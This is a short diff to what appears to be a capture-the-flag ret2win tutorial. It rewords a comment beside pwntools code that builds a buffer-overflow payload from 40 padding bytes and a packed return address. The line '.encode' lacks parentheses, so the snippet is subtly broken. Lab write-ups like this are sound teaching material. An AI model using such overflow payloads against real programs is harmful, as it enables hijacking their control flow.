@@ -43,7 +43,7 @@ In python we can use pwntools to easily assemble this string
 ```
 from pwn import *
 junk = ("A"*40).encode # we encode the string so it can concatinated with the address of ret2win
-payload = junk + p32(0x08048659) #google pwntools to get the python lib pwn it makes packing address painless
+payload = junk + p32(0x08048659) #use pwntools to get the python lib pwn it makes packing address painless
 ```
 
 ![stack](imgs/32bit/stack.png)
